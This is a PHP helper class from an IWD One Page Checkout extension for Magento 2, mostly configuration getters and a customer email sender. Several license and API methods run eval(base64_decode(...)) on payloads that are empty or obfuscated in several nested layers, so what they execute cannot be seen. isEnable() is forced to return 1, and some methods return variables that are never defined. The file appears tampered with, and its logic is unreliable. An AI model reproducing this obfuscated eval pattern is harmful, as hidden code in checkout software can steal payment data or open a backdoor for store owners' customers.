<?php

namespace IWD\Opc\Helper;

use Magento\Framework\App\Helper\Context;
use Magento\Store\Model\StoreManagerInterface;
use Magento\Framework\HTTP\Adapter\CurlFactory;
use Magento\Framework\Message\Session\Proxy as Session;
use Magento\Framework\App\Config\ConfigResource\ConfigInterface;
use Magento\Customer\Model\Session\Proxy as CustomerSession;
use IWD\Opc\Model\FlagFactory;
use Magento\Framework\Json\Helper\Data as JsonHelper;
use Magento\Framework\App\Helper\AbstractHelper;
use Magento\Framework\UrlInterface;
use \Magento\Framework\Mail\Template\TransportBuilder;

final class Data extends AbstractHelper
{

    const XML_PATH_ENABLE = 'iwd_opc/general/enable';

    const XML_PATH_TITLE = 'iwd_opc/extended/title';
    const XML_PATH_DISCOUNT_VISIBILITY = 'iwd_opc/extended/show_discount';
    const XML_PATH_COMMENT_VISIBILITY = 'iwd_opc/extended/show_comment';
    const XML_PATH_GIFT_MESSAGE_VISIBILITY = 'iwd_opc/extended/show_gift_message';
    const XML_PATH_LOGIN_BUTTON_VISIBILITY = 'iwd_opc/extended/show_login_button';
    const XML_PATH_SUBSCRIBE_VISIBILITY = 'iwd_opc/extended/show_subscribe';
    const XML_PATH_SUBSCRIBE_BY_DEFAULT = 'iwd_opc/extended/subscribe_by_default';
    const XML_PATH_ASSIGN_ORDER_TO_CUSTOMER = 'iwd_opc/extended/assign_order';
    const XML_PATH_RELOAD_SHIPPING_ON_DISCOUNT = 'iwd_opc/extended/reload_shipping_methods_on_discount';
    const XML_PATH_DEFAULT_SHIPPING_METHOD = 'iwd_opc/extended/default_shipping_method';
    const XML_PATH_DEFAULT_PAYMENT_METHOD = 'iwd_opc/extended/default_payment_method';
    const XML_PATH_SUCCESS_PAGE_VISIBILITY = 'iwd_opc/extended/show_success_page';
    const XML_PATH_PAYMENT_TITLE_TYPE = 'iwd_opc/extended/payment_title_type';
    const XML_PATH_DISPLAY_ALL_METHODS = 'iwd_opc/extended/show_all_ship_methods';

    const XML_PATH_RESTRICT_PAYMENT_ENABLE = 'iwd_opc/restrict_payment/enable';
    const XML_PATH_RESTRICT_PAYMENT_METHODS = 'iwd_opc/restrict_payment/methods';

    const XML_PATH_GA_AB_TEST_ENABLE = 'iwd_opc/ga_ab_test/enable';
    const XML_PATH_GA_AB_TEST_CODE = 'iwd_opc/ga_ab_test/code';

    public $storeManager;
    public $resourceConfig;
    public $curlFactory;
    public $session;
    public $customerSession;
    public $flagFactory;
    public $response = null;
    public $jsonHelper;
    public $_request;
    protected $_transportBuilder;


    public function __construct(
        Context $context,
        StoreManagerInterface $storeManager,
        CustomerSession $customerSession,
        CurlFactory $curlFactory,
        Session $session,
        ConfigInterface $resourceConfig,
        FlagFactory $flagFactory,
        JsonHelper $jsonHelper,
        TransportBuilder $transportBuilder

    ) {
        parent::__construct($context);
        $this->resourceConfig = $resourceConfig;
        $this->storeManager = $storeManager;
        $this->curlFactory = $curlFactory;
        $this->session = $session;
        $this->customerSession = $customerSession;
        $this->flagFactory = $flagFactory;
        $this->jsonHelper = $jsonHelper;
        $this->_transportBuilder = $transportBuilder;

    }

    public function isEnable()
    {
        $status = $this->scopeConfig->getValue(self::XML_PATH_ENABLE);
        return 1;
        //return (bool)$status;
    }

    public function isGaAbEnable()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_GA_AB_TEST_ENABLE);
    }

    public function getGaAbCode()
    {
        return $this->scopeConfig->getValue(self::XML_PATH_GA_AB_TEST_CODE);
    }

    public function isCheckoutPage()
    {
        return $this->_getRequest()->getModuleName() === 'onepage'
            && $this->isEnable()
            && $this->isModuleOutputEnabled('IWD_Opc');
    }

    public function isCurrentlySecure()
    {
        return (bool)$this->storeManager->getStore()->isCurrentlySecure();
    }

    public function getTitle()
    {
        return $this->scopeConfig->getValue(self::XML_PATH_TITLE);
    }

    public function getDefaultShippingMethod()
    {
        return $this->scopeConfig->getValue(self::XML_PATH_DEFAULT_SHIPPING_METHOD);
    }

    public function getDefaultPaymentMethod()
    {
        return $this->scopeConfig->getValue(self::XML_PATH_DEFAULT_PAYMENT_METHOD);
    }

    public function getRestrictPaymentMethods()
    {
        $methods = $this->scopeConfig->getValue(self::XML_PATH_RESTRICT_PAYMENT_METHODS);
        return $methods ? $this->jsonHelper->jsonDecode($methods) : [];
    }

    public function isRestrictPaymentEnable()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_RESTRICT_PAYMENT_ENABLE);
    }

    public function isShowComment()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_COMMENT_VISIBILITY);
    }

    public function isShowDiscount()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_DISCOUNT_VISIBILITY);
    }

    public function isShowGiftMessage()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_GIFT_MESSAGE_VISIBILITY);
    }

    public function isShowLoginButton()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_LOGIN_BUTTON_VISIBILITY);
    }

    public function isShowSuccessPage()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_SUCCESS_PAGE_VISIBILITY);
    }

    public function isShowSubscribe()
    {
        $moduleStatus = $this->isModuleOutputEnabled('Magento_Newsletter');
        return $this->scopeConfig->getValue(self::XML_PATH_SUBSCRIBE_VISIBILITY)
            && $moduleStatus
            && !$this->customerSession->isLoggedIn();
    }

    public function isSubscribeByDefault()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_SUBSCRIBE_BY_DEFAULT);
    }

    public function isAssignOrderToCustomer()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_ASSIGN_ORDER_TO_CUSTOMER);
    }

    public function isReloadShippingOnDiscount()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_RELOAD_SHIPPING_ON_DISCOUNT);
    }

    public function getPaymentTitleType()
    {
        return $this->scopeConfig->getValue(self::XML_PATH_PAYMENT_TITLE_TYPE);
    }

    public function getClientEmail()
    {
        return trim($this->scopeConfig->getValue('iwd_opc/general/license_email'));
    }

    public function setModuleActive($isActive)
    {
        $this->resourceConfig->saveConfig(self::XML_PATH_ENABLE, (int)$isActive, 'default', 0);
    }

    public function changeModuleOutput($outputDisabled)
    {
        $this->resourceConfig->saveConfig('advanced/modules_disable_output/IWD_Opc', $outputDisabled, 'default', 0);
    }

    public function getLicensingInformation()
    {
        return '<a href="https://www.iwdagency.com/help/general-information/managing-your-product-license">
                    licensing information
                </a>';
    }

    public function getBaseUrl()
    {
        $defaultStore = $this->storeManager->getDefaultStoreView();
        if (!$defaultStore) {
            $allStores = $this->storeManager->getStores();
            if (isset($allStores[0])) {
                $defaultStore = $allStores[0];
            }
        }

        return $defaultStore->getBaseUrl(UrlInterface::URL_TYPE_LINK);
    }

    public function getDisplayAllMethods()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_DISPLAY_ALL_METHODS);
    }

    public function getErrorMessage($response)
    {
        eval(base64_decode(''));
        return __($message);
    }

    public function requestToApi($force = false)
    {
        eval(base64_decode(''));
        return $this->response;
    }

    public function parseResponse($response)
    {
        eval(base64_decode(''));
    }

    public function saveLastApiData($data)
    {
        eval(base64_decode('IGV2YWwgKGJhc2U2NF9kZWNvZGUoJ0lHVjJZV3dnS0dKaGMyVTJORjlrWldOdlpHVW9KMGxIVmpKWlYzZG5TMGRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlLTUd4SVZtcEtXbFl6Wkc1VE1HUkxZVWROZVZaVVNrOVNhbXh5VjJ4a1QyUnNjRWhXVnpsTFRVZDRTVlp0Y0V0WGJGbDZXa2MxVkUxSFVreFpWV1JPWlZaYVZWTnJPVk5oYlhoNVZqSjRhMVF5VW5OalJXaFhWbnBzVEZSWGVFdFRiRlY1WTBaa1ZHSkZOVXBXUjNNMVZXc3hkR1ZGVGxoaGEwcDZWV3RhUjFkR2NFWmpSa3BPVWxad01WWlVSbGRVTVVaellqTmthVkpXU2xkWmJYTXhXVlpaZDFaVVFtdE5WbkJIVjJ0b1QyRkhTa2xSYkd4VllrZG9NMWRXV21GV01VNTBUMWRHVTFZeFNrbFdWM0JMVXpGT1IxTnVVazlXV0VKVVZXdFdTMlJXVlhsa1J6bFdUV3RzTlZWdGVITldWbVJIVTJ4S1dtSkdjRE5hVjNoclZqRndTR1JHVGs1V00yaGFWbXRrZDFFeVJsWk5TR1JwWld0YVZsVnRlRVpsUm14WVRWVTVhMUpzY0RCWlZXUXdWVEF4VjFkcVNsWmxhMXBQV2tSQ2VtVldTbk5oUlRsWVVsVndlVlpYZUdGa01sWnpXa1prWVZJelVsUlZha0p6VGxaYVdFMVVVbFZTYTFZMVZsYzFhMWxXU2taalJsSllZbFJHUzFwWGVFZGtSMDVIWWtVMWFWWnJjRFpXTVdOM1pVWlplVlpzWkdsU2JXaHpWV3BHZDJOR1ZuRlRhbEpxVm0xU2VsZFljRWRpUjBwSlVXeG9WVTFYYUZCV01uaHJVbXMxU1ZwR2FGTlNXRUpWVjFaV2ExVXhUa2RUYkdoUFZsaG9WMVpyVmt0VVZsVjRWbXM1VW1KSE9UTlphMVpUVld4WmVWVnJkRlpXUlVwSVdXMTRUMVpzVW5KVGJVWk9Vak5vUmxaV1dtdGhNVTV6VW1wYVVsZEZjR0ZaVkVwT1RWWnNWbGR1WkZOTlZrb3dXbFZrYzFVd01WaGxSRXBXWld0YVZGcFhlRk5qYkZKMFRsVTFVMWRHU2t4V1ZsSkRVakpLYzFSc1dsVmhNSEJvVkZWa05GSldWbGRhUjNSVVlrVldNMVZ0TURGV1IwVjVWRmhvWVZKNlJreGFSVnBUWkVkV1IxZHJOV2xYUjA0MVZtcEtORlF4Um5KUFZscHBVbGRvVVZZd1pGTmhSbHAxWTBaa1QySkhkekpWTW5CVFdWZEtTR1JFVmxwaE1taHlXVlZhU21WR1pIRldiR2hUVWxoQ05sWkdaRFJpYlZaWVZtdG9iRkl5ZUhCV2FrWkhUVEZrVjFack9XbGlWWEI2V1d0YWIxWXlTblZSYXpWWFlURmFlVnBWV2xOa1IwVjZZVWRvYVZacmNFdFdWRVpxVFZaU1IxZHJiRlZoZW14VFZGY3hORkV4WkhGUmJrNVRVbXRhV1ZkclZuZFZhekZHVjI1V1ZrMVdXbEJWVjNoMlpESktSbFZzV21saVJuQjNWa1prZDFZeVRsZGFTRTVWWVRCd1VWWnNaRFJUVmxGNFlVZDBXbFpzYnpKV2JYQmhWMjFXY21KNlFsaGlWRVpRV2tWYVMyUldXblJTYkU1c1lsaGtNMVpxUWxOVU1VVjVWbTVPYWxKdGVGaFpiR2hUWTBaU1YxVnVUbXBTYmtKWVdWVmFUMkZXU1hkT1JFWllZV3R2ZDFsV1pFdFdWMHBGVW14b1YxSllRbGxXYlhSclVqRmtXRlJyYUd4U1dHaFlWVEJWTVZWR1ZsVlRiazVTWWtjNU0xbHJWbE5WYkZsNVZXdDBWbFpGU2toWmJYaFBWbXhTY2xOdFJrNVNNMmhHVm14ak1WTXhiRmRhUldoclVucFdWMVZ0Y3pGU1JteHhVbTVrV0ZadE9UWlphMXAzWVZaWmVsb3phRlpsYTBwUVdWZHplR015VGtsU2JGcHBWak5vVWxadGRHdGhiVkY0V2tab2FsSlViSEJWYkZKR1RXeGFXRTFZVGxWTmJGcDZWakkxUjFaV1duTlRiVVpWVmpOT05GUnNXbkpsYkVaelVXMTBiR0V3Y0U1V1ZFWlhWREZHYzJJelpHbFNWa3BUVm1wS1UxTXhWbFZSYTJScFlrVTFWMVpIZEV0WlZURkpVV3RzVjJKVVZsaFdNbk4zWkRKS05sSnNjRTVTTW1oVlYxZDBZV1F4U25OV2JsSm9Vak5TVkZSVldtRmtWbHBXVjJzNVVrMXNTakJXUjNSdlZqSktjMWR1UmxWV1JVVjRXbGQ0YTFKV1RuTmFSM1JYWWxoUk1sWlVTbmRXTWtaelZHdGtVMkpzY0ZSVmJYUmhUV3hrY1ZGdVRsTlNhMXBaVjJ0V2QxVnJNVVpYYmxaV1RWWmFVRlZYZUhaa01rcEdWV3hLVjAxc1NreFdWbEpEVWpKS2MySkdhRTlXVkd4eVdXeFdkMlZzVVhoYVJGSm9WakJ3VjFSc1VrdFhSMFY1Vld4a1dtRnJTak5WTUZwWFpFZEdTR1JHVGs1U2JHOTZWbXRXVjFKdFVYaFVXR1JwVWxaS1UxWnFTbE5UTVZaVlVXdGthV0pGTlZkV1IzUkxXVlV4U0dWRlZsWldiVkp5VlRKNFJtUXhTblJPVmxKWFZsUldlVmRXVm1Ga01XUlhWV3hzVm1GNlZtOVphMXBYVGxaYVJsZHRkRlZOUkVaSlZrYzFRMWRyTUhkT1ZWcFhWbTFOTVZsdGVFOVdiRkp5VTIxR1RsSXphRVpXVmxwcllURk9jMUpZWkZOaVZGWlZWbXhWTVZFeFpIRlJiazVUVW10YVdWZHJWakJWTURCNFUyNXdXR0pHY0ZCVVZFWlRZMnhTZFZGc1NsZE5iRXBNVmxaU1ExSXlTbk5VYkZwVllUQndhRlJWWkRSU1ZsWlhXa2QwVkdKRlZqTlZiVEF4VmtaYVZrNVZVbGRXVm5CWVZXMTRZV05yT1ZkWGF6VlhWa1phVUZacVFsTlNNVTE0VW01T1dGZEhhRkZXYkZwaFZURmFkR1ZGZEZKTlZrcEhWV3hvYTFaRk1VaGxSVlpXVm0xU2NsVXllRVprTVVwMFRsWlNWMVpVVmtSV01uQkRZekZLUjFKc2FHRlNXRUpUVkZWV1lXUldWWGhXYXpsV1RXeEtXVlV4YUhOVU1WbDZVVzFvVjFac1NrUldSVnBQVm14U2NsTnRSazVTTTJoR1ZsWmFhMkV4VG5OU1dHUlRZbFJXVlZac1ZURlJNV1J4VVdwQ1YxWXdNVE5VYkZaVFdWZFdjbE5yTVZaTlZscFFWVmQ0ZG1ReVNrWlZiRXBYVFd4S1RGWldVa05TTWtwelZHeGFWV0V3Y0doVVZXaERVMVphZEU1V1pGaGhla0l6V1c1d1IxZHJNVWhoUmxKYVlURndNMVZ0ZUZka1IwWklaRVpPVGxKc2NERldiRlpoVkRGRmVWSnNaR2xTYlhoV1dXeG9iMVZHYkZobFJYUnBWbTFTZWxkWWNFZGhSMHBXWWtSV1YxWjZSVEJXUlZwR1pVWk9jVkpzY0doaE1uUTBWMVprTkdReFdrZFNiR3hYWVROQ1UxUldWbmRsYkdSWVRVaG9WVTFzV2xsV2JYaHpWVzFHY2xOdGFGZGhhMXBNVlcxNGExWXlSa2RVYldoVFYwWktWMWRZY0VKTlZrcEhZMFJhVW1FemFGVldiRlV4VVRGa2NWRnVUbE5TYTFwWlYydFdkMVZyTVVaWGJsWldUVlphVUZWWGVIWmtNazVHWVVkNFUwMXRhSGhXUmxKSFV6RlNjMkpHWkdGU1ZHeHdWV3BDZDAxV1draE5WRkpXVFZWc00xWXhhR3RYUmxwelYyMW9XbVZyV25wV01GcHlaV3hXYzFKdGJHaGxiRm8yVmpKMFYxWXhiRmhVV0docFVtMW9hRlZzV21GWlZsbDNWMnQwYVUxVk1UTldSM2hQWVZaSmQyTkVRbGRTZWxaNldXdGFhMUpzVGxsYVJtaHBVakZLVlZaWGVHRmpNV1JYVm01U2FGSllhRmRhVjNSSFpWWmtXV05GZEZOTlJFWjZXVEJhVTFsVk1IZFRiRVpoVTBoQ1JGWkZXazlXYkZKeVUyMUdUbEl6YUVaV1ZscHJZVEZPYzFKWVpGUldSbHBWVm14a1UxVkdiRlphUms1VVVteEtNRlF4Vm5kVmF6RjBZVWhHVjFZemFIWlpha3BIWXpKT1IySkdTbWhoTUhCMlZtMDFkMk13TVZkVWJGcFZZa1UxY0ZWc2FGTldWbFpZWTBkMFUxWnNXbGxVTVdNeFZrWmFWazVWVGxoaGEwcDZWV3RhUjFkR2NFWmpSa3BPVWxad01WWlVSbGRVTVVWNVZteGthbEp0ZUZkWlYzUmhZMVpzYzFWc1RtbGlSVFY1V1ZWYVQyRlZNWEpYYkhCWFVteEtjbFZzV2xkWFJUbFlUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVlZXdFdSazVXVG5WaVNFcHFVbFJyZWxWR1VYZGlhM1JVWVhwamJrdFRhemNuS1NrNycpKTs='));
        return $this;
    }

    public function getLastApiData()
    {
        eval(base64_decode('IGV2YWwgKGJhc2U2NF9kZWNvZGUoJ0lHVjJZV3dnS0dKaGMyVTJORjlrWldOdlpHVW9KMGxIVmpKWlYzZG5TMGRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlLTUd4SVZtcEtXbFl6Wkc1VE1HUkxZVWROZVZaVVNrOVNhbXh5VjJ4a1QyUnNjRWhXVnpsTFRVZDRTVlp0Y0V0WGJGbDZXa2MxVkUxSFVreFpWV1JPWlZaYVZWTnJPVk5oYlhoNVZqSjRhMVF5VW5OalJXaFhWbnBzVEZSVmFFTlRWbHBZVFZSU1dHRjZRak5aYm5CSFYyc3hTR0ZHVWxwaE1YQXpWVzE0VjJSSFJraGtSazVPVW14d01WWnNWbUZVTVVWNFlraE9hRkpzV25GVVZWSlhVbFpzVjFaclpHbGlSVFZYVmtkMFMxbFZNVWhsUlZaV1ZtMVNjbGxVUms5U2JVbzJVbXhTVjFZeVp6SldhMlF3VkRKT1IxSnNhR0ZTV0VKVFZGVldZV1JXVlhoV2F6bFNZa2M1TTFsclZsTlZiRmw1Vld0MFZsWkZXa3hhVjNoclZqSkdSazlWTlZOaVJYQktWMWQwYTJReGJGZFhhbHBYWVd4d1dWbHJXbUZXUm14V1drWk9WRkpyY0hsWGEyUnpWVEF4UjJORVJsWk5WbHBUV2tSR2RtUXlUa1ppUmxwcFZrZDRkbFpxUWxabFJURkhWbXRvVGxZd1duRlVWbVEwVjFaa2NsWnRkRmhpUm13elZHdG9hMWR0Um5KT1ZYaFZZa1paTUZac1ZURlhSMDVJWTBkc1YySklRakpXTW5SWFlURmFkRk5ZWkd0U2JFcFBWVlJPVTJJeFduVmpSbVJyVFZoQ1IxWnRNVWRoYXpGWVpVWnNXR0V4V2xSWlZsVjRZekZPZFZSc1VrNVNWRlo1VjFSQ2ExVnRWbGRXYmxKWVlsZDRUMVJWVm5kbFJsbDNWV3QwYUUxcmNFbFZNalZUVmpKS2RHVkhSbGRoYXpWMldXeGFjMk5zY0VsVWJXaHBVMFZLV2xaSGVHOWtNV3hYVjI1R2FWTklRbGxXYlRGdlZVWlNWbGR0Tld4V2JGb3dXVlZrTUZVd01VZFhha1pXWld0YVIxcEVSazVrTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzFSc1dsVmhNSEJvVkZWa05GSldWbGRhUjNSVVlrVldNMVZ0TURGV1JscFdUVlJPVkdWcmNFeFZNRlUxVjBkR1NGSnNUbWhsYkZvMlZqRmtNR0V4WkhSVFdHUnJVbXhhY1ZSVlVsZFNWbXhYVm10a2FXSkZOVmRXUjNSTFdWVXhTR1ZGVmxaV2JWSnlWVEo0Um1ReFNuUk9WbEpYVmxSV1ZWZFdVa2RrTVdSSFZXNVdhVkl6YUZsVmJGWnpUVEZaZVdWSGRGWk5WWEJZV1d0YWMxWnRTbGhoUlhSV1lURktSRmx0ZUU5amJIQkZWVzFvVTAxRVJUSldiR1I2WlVkR1IxZFlaRTlYUlRWaFdXeFNWMVZHYkhKWGEzUlVVbXR3ZUZWWGVIZFdNVnAxVVdwYVYwMVdjSEpaVnpGVFVqRkdkVlZ0UmxOTk1taDVWbGQ0WVdReVZuTmFSbVJoVWpOU1ZGWnRNVFJYYkZwWVRWYzVWVkpyVmpWWk0zQlBWVEZLY2xkcVNsaGhhMHA2Vld0YVIxZEdjRVpqUmtwT1VsWndNVlpVUmxkVU1VWnpZak5rYVZKV1NsTlpiWFJMWVVac1YxWnJaR3RpUlRWWVZrZDRUMkZGTVZsUmJHeFhVbnBXZWxscldtdFNiRTVaV2tab2FWSXhTbFZXVjNoaFl6RmtWMVp1VW1oU1dHaFhWRlZXY21Wc1ZuSlhhMlJyWWtjNU0xbHJWbE5WYkZsNVZXdDBWbFpGU2toWmJYaFBWbXhTY2xOdFJrNVNNMmhHVmxaYWEyRXhUbk5TV0dSVFlsUldZVlJYY0VkWFJsSldXa1pPV0Zack5URldiWFIzVlRKS2MxTnVTbGRTUlRWeFdrUkdUbVF5U2taVmJFcFhUV3hLVEZaV1VrTlNNa3B6Vkd4YVZXRXdjR2hVVldRMFVsWldWMXBIZEdsV2JGcFdWVmQwTkZVeFNuSlhha3BZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhWREZHYzJJelpHbFNWa3BUVm1wT1UyTkdXbkZTYlVaUFlrZDNNbFV5ZEd0aFYwcEpVV3hXVmxac1NucFZNbmhLWkRKT1NFOVdjR3hoTTBKWVZrWmtlazFXU1hkUFZtaHJVakJhV0ZSVlVsWmxWbGw1WkVkMFYySlZiRE5aTUZadlZtMUtXV0ZIUmxWV1JVb3lWRlphY21ReVJrZFViV3hUWW10S1NGWnNZM2hpTWtWNFUxaGtWMkp1UWxWV2JHUnZWa1p3VjFwR1RsaFNiSEJhVlZkNFEyRXlWbkpUYXpGV1RWWmFVRlZYZUhaa01rcEdWV3hLVjAxc1NreFdWbEpEVWpKS2MxUnNXbFZoTUhCb1ZGVm9RMU5XVW5OaFIwWm9WakJ3VjFSc2FFOVdNVnBHWTBod1ZXSllhRE5XYTFwSFZsZEtSbU5HVG14aVdHUTJWbXBLTkdGck1WaFdibEpWVjBkNGMxVnFSbmRaVmxKWVRWUlNUazFYZUZkWGExcHJZa1phZEZwRVZscGhNVXBNVmpGVmVHUlhSa2xVYkhCcFZrVmFlVlpHVm10U01VcEhZak5zVDFadVFsaFVWbHAyVFd4YVJsZHNUbFJoZWtaWFZHeG9RMVJzV1hwUmJrcFdUVVphZWxwR1drNWxSbFoxWTBaV2FFMUVWak5XVmxwcllURk9jMUpZWkZOaVZGWlZWbXhWTVZFeFpIRlJiazVUVW10YVdWZHJWbmRWYXpGV1lqTm9XRll6UWt0VVZtUkhZekpPUjFWc1NsZFNNMmhNVmxjMWQxSXlUa2RhUlZaVllYcHNUMVp0TVRSTlZscElZMFZPYUdKVldsbFhhMmhMVjIxS1NGVnNhR0ZXZWtaUFdsWmFTMlJGTlZoU2JGcE9UV3hLTVZacldsZFVNREI0WWpOa2FsSlhhRkJXTUZwM1kwWnNjMVpVUm1wTlZuQldWVEkxVDFReVNrbFJiRlpoVWtWd2NsVjZTbGRrUjBaSlVXeHdWMkpYYUZSWFZ6RXdUVVphV0ZSWVpFOVdWa3B2Vm14V1lXUldWWGhXYXpsU1lrYzVNMWxyVmxOVmJGbDVWV3QwVmxaRlNraFpiWGhQVm14U2MxUnRhR2xXVm5CaFZsWmpkMDVXYkZkYVJWcHFVbXh3V1ZsclpHOWtiRkpXVm01T1UxWlVSa2xYYTJSelZqQXhTVkZ1VWxoWFNFSlFWbXBLUjFkR1VsbGpSbHBwWWxob1RsWldVa2RUTURGSFdraE9hRkpVYkhOWmEyUTBWMVprY2xwRVVsVldhMVl6VlcwMVMxZHRTbFZSVkVaaFVteHdlVnBXV21Gak1WWjBZVVpvVkZKVmNEWldhMVpYVkRGRmVWVnNhRlppUjJoelZUQlZNVlJzVmxWUmEyUnJWbXhHTTFkclZqQmhiRWw0VTJ0V1dGWkZOVVJXVldSVFRteEdjbVZHVWxkV1ZGWkVWakp3UTJNeFNrZFNiR2hoVWxoQ1UxUlZWbUZrVmxWNFZtczVVbUpIT1ROWk1GWnZZVEZKZW1GSVRsZFdSVXBIVkd4YVQxWnNjRWhQVjJ4VFRWWndSMVpVU1hoak1rWkhWMnBhVm1Kc2NGVlpiVFZEWVVac2MxWlVSbFJTYXpWV1ZtMTRRMVV4U25KalNHUlhVbXhLVEZadE1WZGphelZXWVVaU1YxSlVWbEZXYlhCQ1pVVTFSMVZ1VW1wU2JrSnpXVlJPUWsxV2JGbGpSM1JUVm14YVdWUXhZekZXUmxwV1RsVk9XR0ZyU25wVmExcEhWMFp3Um1OR1NrNVNWbkF4VmxSR1YxUXhSblJTV0docVVsZG9XRmxzYUVOalZteDBUVlJTVGsxWVFrZFhhMXByWVVVeFZtTkZiRlppV0VKRVZqSjRWbVF4U2xWV2JGSlhWakF3ZUZkclVrZGtNV1JHVGxac2FsSXpRazlaYlRGdlpFWlplV1JIZEZkTmExb3dWa2MxVjJGV1RraFZia3BXVmtWd2NsWkVSa1psVjBwR1UyMUdUbEl6YUVaV1ZscHJZVEZPYzFKWVpGTmlWRlpWVm14Vk1WRXhaSEZSYms1VFVtdGFXVmRyVm5kVmF6RkdWMjVzVjAxV1NreFpla3BTWlZaS2NtRkdaR2xpV0doWlZsZHdSMWRyTVVkalJWcFZZV3MxVmxsVVFURmtNVlpYV2tkMFZHSkZWak5WYlRBeFZrWmFWazVWVGxoaGEwcDZWV3RhUjFkR2NFWmpSa3BPVWxad01WWlVSbGRVTVVaMFUyNU9hVkp0YUZoWmJUVkRWR3hhY2xadVNteFNiRW93V1ZST2IyRkhTbGRUYTNCV1RWZE5lRlpHV2tkV1ZrWnlaVVpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGVldZV1JXVlhoV2F6bFNZa2M1TTFsclZsTlZiRmw1Vld0MFZsWkZXa3hhVmxwcll6SkdTVk50Y0U1U2EzQlVWMWR3UzJFeFRuTlNXR1JUWWxSV1ZWWnNWVEZSTVdSeFVXNU9VMUpyV2xsWGExWjNWV3N4UmxkdVZsWk5WbHBRVlZkNGRtVkdWbGxoUmtwb1RWaENWMWRYZEZaTlZscFhWMnRhV0ZaR1dsZFVWbFpoVjBaa2NscEhSbFpOVlhCWFZqSjRZVlpzV25KT1NIQlhVak5TVUZrd1drZFhSbkJHWTBaS1RsSldjREZXVkVaWFZERkdjMkl6WkdsU1ZrcFRWbXBLVTFNeFZsVlJhMlJwWWtVMVYxWkhkRXRoUlRGeVkwUkNWVTFYYUZoV01uTjRZekZhY2s5V1NrNWlXR2hFVmpKd1EyTXhTa2RTYkdoaFVsaENVMVJWVm1Ga1ZsVjRWbXM1VW1KSE9UTlphMVpUWVVkV2RGVnJXbGRXYlUweFdXMTRUMVpzVW5KVGJVWk9Vak5vUmxaV1dtdGhNVTV6VWxoa1UySlVWbFZXYkZVeFVURnNWVkp1WkZSU2JIQXdXVEJrZDJGWFNsbGFNM0JZWVRGYWNsWnFTa1psUms1eVlVWk9hR0V3Y0doV2JGSkRVbXMxVjFSc1dtRlRSMUp6V1d4V2MwNVdVbk5hUjBaYVZtdHNORll5TlVkWGJVWnlZMFpTV21FeFdYZFZhMXBYWkVkU1NGSnNaRTVTUmxWNFZqSjRZV0l4UlhkTlZXUnFVbTFvVjFsVVJtRlpWbGwzVjJ0MGFVMVdTa2RXUjNSUFZHeEpkMDVVUmxkaVZFVXdWa1ZhWVZOV1VuSlBWa3BPWWxob1JGWXljRU5qTVVwSFVteG9ZVkpZUWxOVVZWWmhaRlprZEdWRk9WSk5hMXA2V1d0YWMxWnRTbGxSYlRsV1ZrVktTRnBIZUd0U2JGcHpXa1U1VTJKWVVURldiVEF4WVRKRmVGTlliR3hTUlhCaFdXeGtORkV4YkZWU2JtUlhVakJXTlZkclpEUmhNbFp5VTJzeFZrMVdXbEJWVjNoMlpESktSbFZzU2xkTmJFcE1WbFpTUTFJeVNuTlViRnBWWVRCd2FGUlZhRU5UVmxwWVRWUlNXR0Y2UWpOWmJuQkhWMnN4U0dGR1VscGhNWEF6VlcxNFYyUkhSa2hrUms1T1VteHdNVlpzVm1GVU1VVjRZa2hPYUZKc1duRlVWVkpYVWxac1YxWnJaR2xpUlRWWFZrZDBTMWxWTVVobFJWWldWbTFTY2xsc1dsZFdWVEZGWWtWMGJGWXpVak5XUkU1cVQxWkNWRmt6UWt4V1NFMDVTbmxyY0U5M1BUMG5LU2s3JykpOw=='));
        return $decryptedData;
    }
    
    
    public function sendIwdExperienceEmail($customer)
    {
        $store = $this->storeManager->getStore()->getId();
        $transport = $this->_transportBuilder->setTemplateIdentifier('iwd_new_account_from_guest')
            ->setTemplateOptions(['area' => 'frontend', 'store' => $store])
            ->setTemplateVars(
                [
                    'store' => $this->storeManager->getStore(),
                    'email' => $customer->getEmail(),
                ]
            )
            ->setFrom('general')
            // you can config general email address in Store -> Configuration -> General -> Store Email Addresses
            ->addTo($customer->getEmail(), $customer->getName())
            ->getTransport();
        $transport->sendMessage();
        return $this;
    }
}
